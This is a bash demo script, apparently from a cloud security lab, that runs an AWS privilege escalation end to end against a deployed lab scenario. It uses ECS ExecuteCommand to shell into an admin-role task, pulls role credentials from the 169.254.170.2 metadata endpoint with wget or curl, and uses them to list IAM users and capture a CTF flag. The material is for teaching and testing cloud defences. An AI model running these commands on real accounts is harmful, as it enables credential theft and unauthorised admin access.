#!/bin/bash

# Demo script for ecs:ExecuteCommand privilege escalation
# This scenario demonstrates how a user with ecs:ExecuteCommand can shell into
# a running ECS task with an admin role and retrieve credentials from the task metadata


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ecs-006-to-admin-starting-user"
TARGET_ROLE="pl-prod-ecs-006-to-admin-target-role"
ECS_CLUSTER="pl-prod-ecs-006-to-admin-cluster"
ECS_SERVICE="pl-prod-ecs-006-to-admin-service"
CONTAINER_NAME="sleep-container"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}ECS ExecuteCommand Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Check for Session Manager plugin (required for ecs execute-command)
echo -e "${YELLOW}Prerequisites Check: AWS Session Manager Plugin${NC}"
if command -v session-manager-plugin &> /dev/null; then
    echo -e "${GREEN}Session Manager plugin is installed${NC}"
else
    echo -e "${RED}WARNING: AWS Session Manager plugin is not installed${NC}"
    echo "The ecs execute-command requires the Session Manager plugin."
    echo ""
    echo "Install instructions:"
    echo "  macOS:   brew install --cask session-manager-plugin"
    echo "  Linux:   https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html"
    echo "  Windows: https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html"
    echo ""
    echo -e "${YELLOW}This demo will show the attack steps but may fail at the execute-command step${NC}"
fi
echo ""

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ecs_006_ecs_executecommand_describetasks.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ECS_CLUSTER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ecs_cluster_name // empty')
ECS_SERVICE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ecs_service_name // empty')

# Use defaults if not in output
if [ -z "$ECS_CLUSTER_NAME" ] || [ "$ECS_CLUSTER_NAME" == "null" ]; then
    ECS_CLUSTER_NAME="$ECS_CLUSTER"
fi
if [ -z "$ECS_SERVICE_NAME" ] || [ "$ECS_SERVICE_NAME" == "null" ]; then
    ECS_SERVICE_NAME="$ECS_SERVICE"
fi

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "ECS Cluster: $ECS_CLUSTER_NAME"
echo "ECS Service: $ECS_SERVICE_NAME"
echo -e "${GREEN}Completed: Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_user_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_user_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}Completed: Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}Completed: Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}WARNING: Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}Completed: Confirmed cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Discover running tasks in the cluster
# Step 5: List tasks in the ECS cluster
echo -e "${YELLOW}Step 5: Discovering ECS tasks in the cluster${NC}"
echo "Cluster: $ECS_CLUSTER_NAME"
use_readonly_creds

TASK_ARNS=$(aws ecs list-tasks \
    --region $AWS_REGION \
    --cluster $ECS_CLUSTER_NAME \
    --service-name $ECS_SERVICE_NAME \
    --query 'taskArns[*]' \
    --output text)

if [ -z "$TASK_ARNS" ] || [ "$TASK_ARNS" == "None" ]; then
    echo -e "${RED}Error: No running tasks found in service $ECS_SERVICE_NAME${NC}"
    echo "Make sure the ECS service is running with at least one task"
    exit 1
fi

# Get the first task ARN
TASK_ARN=$(echo $TASK_ARNS | awk '{print $1}')
echo "Found task: $TASK_ARN"
echo -e "${GREEN}Completed: Discovered running ECS task${NC}\n"

# [OBSERVATION] Get task details to identify the admin role
# Step 6: Get task details
echo -e "${YELLOW}Step 6: Getting task details${NC}"
show_attack_cmd "ReadOnly" "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
TASK_INFO=$(aws ecs describe-tasks \
    --region $AWS_REGION \
    --cluster $ECS_CLUSTER_NAME \
    --tasks $TASK_ARN \
    --output json)

TASK_ROLE_ARN=$(echo "$TASK_INFO" | jq -r '.tasks[0].overrides.taskRoleArn // .tasks[0].taskDefinitionArn' | head -1)
TASK_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].lastStatus')

# Get the task definition to see the task role
TASK_DEF_ARN=$(echo "$TASK_INFO" | jq -r '.tasks[0].taskDefinitionArn')
echo "Task Definition: $TASK_DEF_ARN"
echo "Task Status: $TASK_STATUS"

# Get task role from task definition
TASK_DEF_INFO=$(aws ecs describe-task-definition \
    --region $AWS_REGION \
    --task-definition $TASK_DEF_ARN \
    --output json)

TASK_ROLE_ARN=$(echo "$TASK_DEF_INFO" | jq -r '.taskDefinition.taskRoleArn')
echo "Task Role ARN: $TASK_ROLE_ARN"

if [[ "$TASK_ROLE_ARN" == *"$TARGET_ROLE"* ]]; then
    echo -e "${GREEN}Completed: Task has the admin role attached!${NC}"
else
    echo -e "${YELLOW}Note: Task role may be different than expected${NC}"
fi
echo ""

# [OBSERVATION] Poll ECS Exec agent status until ready
# Step 7: Wait for ECS Exec agent to be ready
echo -e "${YELLOW}Step 7: Waiting for ECS Exec agent to be ready${NC}"
echo "The ExecuteCommandAgent needs time to initialize after task startup..."

MAX_WAIT=120  # Maximum wait time in seconds
WAIT_INTERVAL=10
ELAPSED=0

while [ $ELAPSED -lt $MAX_WAIT ]; do
    AGENT_STATUS=$(aws ecs describe-tasks \
        --region $AWS_REGION \
        --cluster $ECS_CLUSTER_NAME \
        --tasks $TASK_ARN \
        --query 'tasks[0].containers[0].managedAgents[?name==`ExecuteCommandAgent`].lastStatus' \
        --output text 2>/dev/null)

    if [ "$AGENT_STATUS" == "RUNNING" ]; then
        echo -e "${GREEN}Completed: ECS Exec agent is running!${NC}\n"
        break
    fi

    echo "  Agent status: ${AGENT_STATUS:-PENDING} (waited ${ELAPSED}s, will retry...)"
    sleep $WAIT_INTERVAL
    ELAPSED=$((ELAPSED + WAIT_INTERVAL))
done

if [ "$AGENT_STATUS" != "RUNNING" ]; then
    echo -e "${RED}Warning: ECS Exec agent may not be ready (status: $AGENT_STATUS)${NC}"
    echo "The execute-command may fail. You can wait and try again manually."
    echo ""
fi

# [EXPLOIT] Execute command on ECS task to extract admin credentials
# Step 8: Execute command to retrieve credentials from task metadata
use_starting_user_creds
echo -e "${YELLOW}Step 8: Executing command on ECS task to retrieve credentials${NC}"
echo "This is the privilege escalation - we shell into the task and access its IAM role credentials"
echo ""
echo -e "${BLUE}Command: aws ecs execute-command --cluster $ECS_CLUSTER_NAME --task $TASK_ARN --container $CONTAINER_NAME --interactive --command <command>${NC}"
echo ""

# The ECS task metadata endpoint for getting credentials
# For ECS tasks, credentials are at: 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
echo "Retrieving credentials from ECS task metadata endpoint..."
echo "Endpoint: 169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
echo ""

# Execute command to get the credentials from ECS task metadata
# Note: Must use sh -c and escape $ so variable is expanded INSIDE the container
# The AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var only exists inside the container
# Use a temp file to capture output (works better with interactive SSM sessions)
TEMP_OUTPUT_FILE=$(mktemp)
show_attack_cmd "Attacker" "aws ecs execute-command --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task $TASK_ARN --container $CONTAINER_NAME --interactive --command 'sh -c \"wget -qO- 169.254.170.2\\\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"'"
aws ecs execute-command \
    --region $AWS_REGION \
    --cluster $ECS_CLUSTER_NAME \
    --task $TASK_ARN \
    --container $CONTAINER_NAME \
    --interactive \
    --command 'sh -c "wget -qO- 169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"' > "$TEMP_OUTPUT_FILE" 2>&1 || true
CREDENTIALS_OUTPUT=$(cat "$TEMP_OUTPUT_FILE")
rm -f "$TEMP_OUTPUT_FILE"

# Check if we got credentials
if echo "$CREDENTIALS_OUTPUT" | grep -q "AccessKeyId"; then
    echo -e "${GREEN}Successfully retrieved credentials from ECS task!${NC}"
    echo ""

    # Parse the credentials
    # The output contains SSM session data and JSON credentials mixed together
    # Extract the JSON object containing AccessKeyId
    # The JSON is a single line like: {"RoleArn":"...","AccessKeyId":"...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
    CREDS_JSON=$(echo "$CREDENTIALS_OUTPUT" | grep -o '{"RoleArn"[^}]*"Expiration":"[^"]*"}' | head -1)

    # Fallback to simpler extraction if the above didn't work
    if [ -z "$CREDS_JSON" ]; then
        CREDS_JSON=$(echo "$CREDENTIALS_OUTPUT" | grep -o '{[^{]*"AccessKeyId"[^}]*}' | head -1)
    fi

    if [ -n "$CREDS_JSON" ]; then
        STOLEN_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId // empty')
        STOLEN_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey // empty')
        STOLEN_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token // empty')

        echo "Retrieved credentials:"
        echo "  Access Key ID: ${STOLEN_ACCESS_KEY:0:10}..."
        echo "  Secret Access Key: [REDACTED]"
        echo "  Session Token: ${STOLEN_SESSION_TOKEN:0:20}..."
        echo -e "${GREEN}Completed: Retrieved admin role credentials from task metadata${NC}"
    else
        echo -e "${YELLOW}Could not parse credentials from output${NC}"
        echo "Raw output (first 500 chars):"
        echo "${CREDENTIALS_OUTPUT:0:500}"
    fi
else
    echo -e "${YELLOW}Could not retrieve credentials automatically${NC}"
    echo ""
    echo "This may be due to:"
    echo "  1. Session Manager plugin not installed"
    echo "  2. Interactive session requirements"
    echo "  3. Network connectivity issues"
    echo ""
    echo -e "${BLUE}To manually retrieve credentials, run:${NC}"
    echo ""
    echo "  aws ecs execute-command \\"
    echo "    --region $AWS_REGION \\"
    echo "    --cluster $ECS_CLUSTER_NAME \\"
    echo "    --task $TASK_ARN \\"
    echo "    --container $CONTAINER_NAME \\"
    echo "    --interactive \\"
    echo "    --command '/bin/sh'"
    echo ""
    echo "Then inside the container, run:"
    echo "  wget -qO- http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
    echo ""
    echo "Or with curl:"
    echo "  curl -s http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
    echo ""

    # Try to provide manual instructions for completing the demo
    echo -e "${YELLOW}Waiting for manual credential retrieval...${NC}"
    echo "Please copy the credentials from the ECS task and paste them below."
    echo ""

    read -p "Enter AccessKeyId (or press Enter to skip): " STOLEN_ACCESS_KEY
    if [ -n "$STOLEN_ACCESS_KEY" ]; then
        read -p "Enter SecretAccessKey: " STOLEN_SECRET_KEY
        read -p "Enter Token (SessionToken): " STOLEN_SESSION_TOKEN
    fi
fi

# Step 9: Use stolen credentials to verify admin access
if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_SESSION_TOKEN" ]; then
    echo ""
    echo -e "${YELLOW}Step 9: Verifying administrator access with stolen credentials${NC}"

    # Switch to stolen credentials
    export AWS_ACCESS_KEY_ID=$STOLEN_ACCESS_KEY
    export AWS_SECRET_ACCESS_KEY=$STOLEN_SECRET_KEY
    export AWS_SESSION_TOKEN=$STOLEN_SESSION_TOKEN
    export AWS_REGION=$AWS_REGION

    # Verify identity
    echo "Verifying new identity..."
    show_cmd "Attacker" "aws sts get-caller-identity --output json"
    NEW_IDENTITY=$(aws sts get-caller-identity --output json)
    echo "$NEW_IDENTITY" | jq .

    ASSUMED_ROLE=$(echo "$NEW_IDENTITY" | jq -r '.Arn')
    if [[ "$ASSUMED_ROLE" == *"$TARGET_ROLE"* ]]; then
        echo -e "${GREEN}Completed: Now operating as the admin role!${NC}"
    fi
    echo ""

    # Step 10: Verify admin access by listing IAM users
    echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
    echo "Attempting to list IAM users..."

    show_cmd "Attacker" "aws iam list-users --max-items 3 --output table --no-cli-pager"
    if aws iam list-users --max-items 3 --output table --no-cli-pager; then
        echo -e "${GREEN}Completed: Successfully listed IAM users!${NC}"
        echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
    else
        echo -e "${RED}Failed to list users - credentials may have expired or lack permissions${NC}"
        exit 1
    fi
    echo ""

    # Step 11: Capture the CTF flag
    # [EXPLOIT] The stolen task role credentials have AdministratorAccess, which grants
    # ssm:GetParameter implicitly. Use those credentials to read the scenario flag.
    echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
    FLAG_PARAM_NAME="/pathfinding-labs/flags/ecs-006-to-admin"
    show_attack_cmd "Attacker (task role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
    FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
        echo -e "${GREEN}Flag captured: ${FLAG_VALUE}${NC}"
    else
        echo -e "${RED}Failed to read flag from $FLAG_PARAM_NAME${NC}"
        exit 1
    fi
    echo ""

    # Restore helpful permissions for manual exploration
    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

    echo -e "\n${GREEN}========================================${NC}"
    echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "\n${YELLOW}Attack Summary:${NC}"
    echo "1. Started as: $STARTING_USER (with ecs:ExecuteCommand permissions)"
    echo "2. Discovered running ECS task in cluster: $ECS_CLUSTER_NAME"
    echo "3. Task was running with admin role: $TARGET_ROLE"
    echo "4. Used ecs:ExecuteCommand to shell into the task"
    echo "5. Retrieved IAM role credentials from task metadata endpoint"
    echo "6. Achieved: Administrator Access via stolen task role credentials"
    echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

    echo -e "\n${YELLOW}Attack Path:${NC}"
    echo -e "  $STARTING_USER"
    echo -e "  -> (ecs:ExecuteCommand + ecs:DescribeTasks) -> ECS Task Container"
    echo -e "  -> (curl metadata) -> $TARGET_ROLE credentials"
    echo -e "  -> (ssm:GetParameter) -> CTF Flag"

    if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
        echo -e "\n${YELLOW}Attack Commands:${NC}"
        for cmd in "${ATTACK_COMMANDS[@]}"; do
            echo -e "  ${CYAN}\$ ${cmd}${NC}"
        done
    fi

    echo -e "\n${YELLOW}Key Insight:${NC}"
    echo "The ecs:ExecuteCommand permission allows shelling into any running ECS task."
    echo "If a task has a privileged IAM role, the attacker can retrieve those credentials"
    echo "from the container metadata endpoint (169.254.170.2) and use them directly."

    echo -e "\n${YELLOW}No Cleanup Required:${NC}"
    echo "This attack only reads existing credentials - no artifacts are created."
    echo "The stolen credentials are temporary (session credentials) and will expire."

else
    echo ""
    echo -e "${YELLOW}Demo requires manual completion${NC}"
    echo "To complete this attack:"
    echo "1. Use the execute-command shown above to shell into the ECS task"
    echo "2. Retrieve credentials from the metadata endpoint"
    echo "3. Export them as AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN"
    echo "4. Verify admin access with: aws iam list-users"
fi

echo ""
echo -e "${YELLOW}MITRE ATT&CK Techniques:${NC}"
echo "  - T1552.005: Unsecured Credentials: Cloud Instance Metadata API"
echo "  - T1059: Command and Scripting Interpreter"
echo "  - TA0004: Privilege Escalation"
echo "  - TA0006: Credential Access"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
